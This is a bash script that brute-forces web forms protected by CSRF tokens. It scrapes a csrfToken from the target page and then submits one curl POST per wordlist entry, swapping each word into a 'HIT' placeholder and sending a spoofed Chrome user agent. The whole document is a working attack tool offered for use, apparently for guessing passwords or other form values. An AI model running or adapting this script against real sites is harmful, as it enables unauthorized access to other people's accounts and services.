#!/bin/bash
function csrf_brutus_one() {
    local url=$1
    local data=$2
    local token=$3
    local cfile=$4
    local file=$5
    local agent="Chrome/100.0.4896.127" # Chrome/100.0 og script
    while read -r line; do
        if echo "$data"|grep -q "HIT"; then
            hitter=$(echo "$data"|sed "s/HIT/$line/g")
        fi
        curl -b "$cfile" -c "$cfile" -v \
            -L "$url" \
            -A "$agent" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            --data "$hitter&_csrf=$token"
        echo ""
    done < "$file"
}
function extractToken() {
    local url=$1
    local c=$2
    local o=$3
    curl -c "$c" "$url" -o "$o" -s # -s was not in the original script
    CSRF_TOKEN=$(grep -oP '"csrfToken":"\K[^"]+' "$o")
}
url="$1"
wlfile="$2"
cfile="cookes.txt"
ofile="index.html"
params=$(echo "$url"|cut -d'?' -f2)
base=$(echo "$url"|cut -d'?' -f1)
extractToken "$url" "$cfile" "$ofile"
csrf_brutus_one "$base" "$params" "$CSRF_TOKEN" "$cfile" "$wlfile"
rm "$cfile";rm "$ofile"
exit 0